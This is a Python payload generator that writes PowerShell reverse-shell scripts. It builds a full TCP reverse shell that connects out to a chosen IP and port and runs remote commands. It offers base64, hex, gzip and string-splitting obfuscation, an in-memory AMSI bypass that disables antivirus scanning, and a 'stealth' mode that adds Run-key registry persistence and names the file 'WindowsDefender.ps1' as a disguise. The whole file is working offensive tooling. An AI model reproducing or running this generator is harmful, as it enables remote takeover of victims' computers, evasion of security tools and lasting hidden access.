import os
import random
import string
import base64

def random_comment_ps():
    return "# " + ''.join(random.choices(string.ascii_letters, k=10))

def split_command_ps(cmd):
    # Split into smaller strings and recombine
    parts = [cmd[i:i+5] for i in range(0, len(cmd), 5)]
    var_names = ['$' + ''.join(random.choices(string.ascii_lowercase, k=3)) for _ in parts]
    code = ""
    for var, part in zip(var_names, parts):
        code += f"{var} = '{part}'\n"
    concat = ''.join(var_names)
    code += f"IEX (${{concat}} -join '')"
    return code

def generate_manual(ip, port, obfuscation="0", stealth=False):
    # PowerShell reverse shell (standard)
    ps_script = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    
    if obfuscation == "0":
        final = ps_script
    elif obfuscation == "1":  # Base64 encode entire script
        encoded = [base64.b64encode(ps_script.encode()).decode()]
        final = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded[0]}"
    elif obfuscation == "2":  # Base64 + Hex (double obfuscation)
        b64 = base64.b64encode(ps_script.encode()).decode()
        hexed = b64.encode().hex()
        final = f"$h='{hexed}';$b=[System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes(($h-split'(..)'-ne''-join''|%{{[char][int]('0x'+$_)}})));IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b)))"
    elif obfuscation == "3":  # gzip + Base64 (complex but stealthy)
        import gzip
        compressed = gzip.compress(ps_script.encode())
        b64_comp = base64.b64encode(compressed).decode()
        final = f"$c='{b64_comp}';$d=[System.Convert]::FromBase64String($c);$e=New-Object System.IO.MemoryStream(,$d);$f=New-Object System.IO.Compression.GZipStream($e,[System.IO.Compression.CompressionMode]::Decompress);$g=New-Object System.IO.StreamReader($f);$h=$g.ReadToEnd();IEX $h"
    elif obfuscation == "4":  # SUPER: random comments + command splitting + AMSI bypass
        # Add AMSI bypass snippet
        amsi_bypass = "$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like '*iUtils'){$c=$b;break}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e.Name -like '*Context'){$f=$e;break}};$g=$f.GetValue($null);[IntPtr]$ptr=$g.GetField('_pConfig',[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Instance).GetValue($g);[Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x0)"
        # Random comments
        comments = '\n'.join([random_comment_ps() for _ in range(3)])
        # Command splitting
        split_cmd = split_command_ps(ps_script)
        final = f"{amsi_bypass}\n{comments}\n{split_cmd}"
    else:
        final = ps_script

    # Add persistence via registry if stealth mode
    if stealth:
        reg_key = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        pers = f'\n# Persistence\nSet-ItemProperty -Path "{reg_key}" -Name "Updater" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \'{final}\'"'
        final += pers

    # Save to file
    os.makedirs("output", exist_ok=True)
    filename = "payload.ps1"
    if stealth:
        filename = "WindowsDefender.ps1"  # fake name
    with open(os.path.join("output", filename), "w") as f:
        f.write(final)
    print(f"[+] PowerShell payload saved to output/{filename}")